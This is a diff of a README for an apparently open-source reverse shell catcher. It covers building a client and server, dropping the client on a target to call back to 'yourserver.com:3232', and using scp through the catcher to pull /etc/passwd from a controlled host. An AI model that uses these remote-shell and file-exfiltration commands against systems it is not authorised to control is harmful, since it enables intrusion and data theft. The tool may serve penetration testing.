@@ -31,15 +31,21 @@ You, the human client connect to the reverse shell catcher with ssh, and then se
 
 ## Setup Instructions
 
-Depending on the platform that you're building the server and client for. You may need to change the GOOS and GOARCH enviroment variables. E.g building for linux:
+
 ```
-GOOS=linux GOARCH=amd64 make
+make
 ```
 
-Make will build both the `client` and `server` binaries. If you're dropping the `client` binary on a target with a different architecture you will need to change this.
+Make will build both the `client` and `server` binaries. It will also generate a private key for the `client`, and copy it to the `authorized_controllee_keys` file.
+If you need to build the client for a different architecture. 
 
-The server will automatically generate a private key on first use. Or you can specify one with `--key`. You will need to create an `authorized_keys` file, containing *your* public key. 
-This will allow the server to authenticate you, to allow you to control whatever reverse shell connections it catches. 
+```
+GOOS=linux GOARCH=amd64 make client
+```
+
+
+You will need to create an `authorized_keys` file, containing *your* public key. 
+This will allow you to control whatever server catches. 
 ```
 cp ~/.ssh/id_ed25519.pub authorized_keys
 ./server 0.0.0.0:3232 #Set the server to listen on port 3232
@@ -49,9 +55,6 @@ Put the client binary on whatever you want to control.
 ```
 ./client yourserver.com:3232
 ```
-
-This will cause the client to fork into the background. If you want to montior the output for debugging purposes specify `--foreground`.  
-The client will attempt to detect shells such as bash, ash, sh and execute one of those if possible. If it cant find one. Then you will be asked to enter in a path.
 
 Then connect to your reverse shell catcher server:
 
@@ -102,15 +105,13 @@ scp -P 3232 test catcher.com:0be2782caae4bedff780e14526f7618ab61e24fa:/etc/passw
 
 On connection you will be presented by a list of controllable clients, e.g:
 ```
-               Targets
-----------------------------------------------------------
-| ID                                       | IP Address  |
-----------------------------------------------------------
-| aee61d906398fde43034e7986ed1ee2f94bb0bf2 | [::1]:38228 |
-----------------------------------------------------------
-| fce2b96df94f6e0e33aab7951e2142a378df9148 | [::1]:38232 |
-----------------------------------------------------------
-catcher$ 
+catcher$ ls
+                    Targets
+---------------------------------------------------------------------
+| ID                                       | Hostname | IP Address  |
+---------------------------------------------------------------------
+| 0f6ffecb15d75574e5e955e014e0546f6e2851ac | wombo  | [::1]:45150 |
+---------------------------------------------------------------------
 ```
 
 Use `help` or press `tab` to view commands.  
